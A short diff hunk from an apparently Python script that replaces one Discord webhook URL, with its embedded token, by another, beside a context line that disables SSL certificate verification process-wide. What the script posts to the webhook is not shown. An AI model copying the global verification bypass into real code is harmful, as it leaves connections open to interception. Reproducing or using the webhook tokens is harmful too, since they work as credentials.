@@ -22,7 +22,7 @@ import hashlib
 import random
 
 # ════════ WEBHOOK CONFIG ════════
-WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1427133743532867615/yzUXogsnbwPc65h9EcY8p6ShLiwWtE0Kig3F8AMf3vO700uB9LhVsGQLKRUFv391pey0"
 
 # ════════ DISABLE SSL VERIFICATION ════════
 ssl._create_default_https_context = ssl._create_unverified_context
